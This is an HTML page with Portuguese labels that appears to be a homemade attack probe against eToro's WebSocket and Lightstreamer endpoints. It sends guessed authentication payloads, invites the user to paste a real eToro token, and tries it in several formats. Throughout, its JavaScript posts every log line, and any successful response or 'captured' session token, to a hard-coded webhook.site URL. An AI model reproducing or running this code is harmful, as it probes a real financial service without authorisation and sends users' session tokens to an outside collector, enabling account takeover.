<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eToro WebSocket Auth Test</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: monospace;
            padding: 20px;
        }
        .success { color: #00ff00; }
        .error { color: #ff4444; }
        .info { color: #ffaa00; }
        .log {
            border-bottom: 1px solid #333;
            padding: 5px;
            margin: 5px 0;
        }
        button {
            background: #2a2a3e;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #00ff00;
            color: #0a0a0a;
        }
        textarea {
            width: 100%;
            height: 100px;
            background: #1a1a2e;
            color: #00ff00;
            border: 1px solid #333;
            font-family: monospace;
            padding: 10px;
        }
    </style>
</head>
<body>
    <h1>🔐 eToro WebSocket - Teste de Autenticação</h1>
    <div class="info">✅ Descoberta: WebSocket ACEITA conexão cross-origin (github.io → etoro.com)</div>
    <div class="info">🎯 Agora testando formatos de autenticação...</div>
    
    <div>
        <button onclick="testAuth1()">Teste 1: userKey + apiKey</button>
        <button onclick="testAuth2()">Teste 2: JWT Bearer</button>
        <button onclick="testAuth3()">Teste 3: Session Token</button>
        <button onclick="testAuth4()">Teste 4: Lightstreamer Format</button>
        <button onclick="testAllAuth()">⚡ TESTAR TODOS</button>
        <button onclick="clearLogs()">Limpar</button>
    </div>
    
    <div style="margin-top: 20px;">
        <div class="info">📝 Token para teste (cole aqui se tiver):</div>
        <textarea id="tokenInput" placeholder="Cole um token da eToro aqui se tiver acesso..."></textarea>
        <button onclick="testWithCustomToken()">Testar com Token Personalizado</button>
    </div>
    
    <div id="logs" style="margin-top: 20px; height: 500px; overflow-y: auto; background: #000; padding: 10px;"></div>
    
    <script>
        const WEBHOOK = 'https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022';
        
        function addLog(message, type = 'info') {
            const logs = document.getElementById('logs');
            const logDiv = document.createElement('div');
            logDiv.className = `log ${type}`;
            logDiv.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            logs.appendChild(logDiv);
            logs.scrollTop = logs.scrollHeight;
            
            // Envia para webhook
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ timestamp: Date.now(), message, type })
            }).catch(() => {});
        }
        
        function testAuth1() {
            addLog('🚀 Teste 1: Autenticando com userKey + apiKey', 'info');
            const ws = new WebSocket("wss://ws.etoro.com/ws");
            
            ws.onopen = () => {
                addLog('✅ Conexão estabelecida', 'success');
                
                const authMsg = {
                    id: crypto.randomUUID(),
                    operation: "Authenticate",
                    data: {
                        userKey: "test_user_key_12345",
                        apiKey: "test_api_key_67890"
                    }
                };
                
                ws.send(JSON.stringify(authMsg));
                addLog(`📤 Enviado: ${JSON.stringify(authMsg)}`, 'info');
            };
            
            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                addLog(`📥 Recebido: ${JSON.stringify(data)}`, 
                       data.success ? 'success' : 'error');
                
                if(data.success) {
                    addLog('🎉 AUTENTICAÇÃO FUNCIONOU! Token capturado!', 'success');
                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                }
            };
            
            ws.onerror = () => addLog('❌ Erro na conexão', 'error');
        }
        
        function testAuth2() {
            addLog('🚀 Teste 2: Autenticando com JWT Bearer', 'info');
            const ws = new WebSocket("wss://ws.etoro.com/ws");
            
            ws.onopen = () => {
                addLog('✅ Conexão estabelecida', 'success');
                
                const authMsg = {
                    id: crypto.randomUUID(),
                    operation: "Authenticate",
                    data: {
                        token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0X3VzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTUxNjIzOTAyMn0.test123"
                    }
                };
                
                ws.send(JSON.stringify(authMsg));
                addLog(`📤 Enviado: ${JSON.stringify(authMsg)}`, 'info');
            };
            
            ws.onmessage = (e) => addLog(`📥 Recebido: ${e.data}`, 'info');
            ws.onerror = () => addLog('❌ Erro', 'error');
        }
        
        function testAuth3() {
            addLog('🚀 Teste 3: Autenticando com Session Token', 'info');
            const ws = new WebSocket("wss://ws.etoro.com/ws");
            
            ws.onopen = () => {
                addLog('✅ Conexão estabelecida', 'success');
                
                const authMsg = {
                    id: crypto.randomUUID(),
                    operation: "Authenticate",
                    data: {
                        sessionToken: "sess_test_12345_abcde",
                        userId: "user_123"
                    }
                };
                
                ws.send(JSON.stringify(authMsg));
                addLog(`📤 Enviado: ${JSON.stringify(authMsg)}`, 'info');
            };
            
            ws.onmessage = (e) => addLog(`📥 Recebido: ${e.data}`, 'info');
            ws.onerror = () => addLog('❌ Erro', 'error');
        }
        
        function testAuth4() {
            addLog('🚀 Teste 4: Formato Lightstreamer', 'info');
            const ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
            
            ws.onopen = () => {
                addLog('✅ Conexão estabelecida com Lightstreamer', 'success');
                
                const commands = [
                    "create_session\r\nLS_user=test&LS_adapter_set=PROXY_PUSH",
                    "create_session\r\nLS_user=anonymous&LS_adapter_set=DEFAULT",
                    "control\r\nLS_op=add&LS_table=1&LS_id=1"
                ];
                
                commands.forEach((cmd, i) => {
                    setTimeout(() => {
                        ws.send(cmd);
                        addLog(`📤 Lightstreamer: ${cmd.replace(/\n/g, '\\n')}`, 'info');
                    }, i * 1000);
                });
            };
            
            ws.onmessage = (e) => {
                addLog(`📥 Lightstreamer Response: ${e.data.substring(0, 200)}`, 
                       e.data.includes('ERROR') ? 'error' : 'info');
                       
                if(e.data.includes('SESSION') || e.data.includes('token')) {
                    addLog('🎯 Possível token/sessão capturado!', 'success');
                }
            };
            
            ws.onerror = () => addLog('❌ Erro Lightstreamer', 'error');
        }
        
        function testWithCustomToken() {
            const token = document.getElementById('tokenInput').value;
            if(!token) {
                addLog('⚠️ Cole um token no campo acima primeiro!', 'error');
                return;
            }
            
            addLog(`🚀 Testando com token: ${token.substring(0, 50)}...`, 'info');
            const ws = new WebSocket("wss://ws.etoro.com/ws");
            
            ws.onopen = () => {
                addLog('✅ Conexão estabelecida', 'success');
                
                // Tenta diferentes formatos
                const formats = [
                    { userKey: token, apiKey: "" },
                    { token: token },
                    { jwt: token },
                    { sessionToken: token }
                ];
                
                formats.forEach((format, i) => {
                    setTimeout(() => {
                        const authMsg = {
                            id: crypto.randomUUID(),
                            operation: "Authenticate",
                            data: format
                        };
                        ws.send(JSON.stringify(authMsg));
                        addLog(`📤 Teste formato ${i+1}: ${JSON.stringify(authMsg)}`, 'info');
                    }, i * 1000);
                });
            };
            
            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                addLog(`📥 Resposta: ${JSON.stringify(data)}`, 
                       data.success ? 'success' : 'error');
                
                if(data.success && data.data && data.data.token) {
                    addLog('🔥 TOKEN DE SESSÃO CAPTURADO!', 'success');
                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                }
            };
        }
        
        function testAllAuth() {
            addLog('🚨 INICIANDO TODOS OS TESTES DE AUTENTICAÇÃO', 'info');
            testAuth1();
            setTimeout(testAuth2, 3000);
            setTimeout(testAuth3, 6000);
            setTimeout(testAuth4, 9000);
        }
        
        function clearLogs() {
            document.getElementById('logs').innerHTML = '';
            addLog('Logs limpos', 'info');
        }
        
        addLog('✅ Ferramenta carregada. WebSocket ACEITA conexão cross-origin!', 'success');
        addLog('🎯 Testando formatos de autenticação...', 'info');
    </script>
</body>
</html>
